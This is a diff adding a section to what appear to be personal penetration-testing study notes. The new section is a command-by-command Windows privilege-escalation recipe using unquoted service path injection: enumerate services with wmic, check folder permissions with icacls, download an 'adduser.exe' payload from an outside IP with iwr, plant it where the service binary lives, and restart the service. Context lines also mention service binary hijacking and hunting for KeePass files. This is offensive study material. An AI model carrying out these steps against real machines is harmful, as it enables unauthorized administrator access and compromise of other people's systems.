@@ -115,6 +115,31 @@ Should be pwnage.
 
 
 
+UNQUOTED SERVICE PATH INJECTION
+
+Again run same first command from service binary hijacking. -- Finds possible running vuln services. 
+
+wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """ -- Same command as powershell command but from cmd line.
+
+Start-Service "pwnableservice" -- See if you can start and stop service. If not, see if it starts automatically and try restarting machine.
+
+icacls "C:\"
+
+icacls "C:\Program Files" -- Check privs on directories starting with C:\ going all the way down to where the binary lives.
+
+iwr -uri http://192.168.48.3/adduser.exe -Outfile <nameofpwnablebinary>.exe -- use the same C binary we used in service binary hijacking.
+
+copy .\Current.exe 'C:\Program Files\Enterprise Apps\Current.exe' -- Copy it into directory where binary lives.
+
+Start-Service <pwnableservice> OR restart machine
+
+pwnage.
+
+
+
+
+
+
 MISC
 
 1. Finds keepass files.
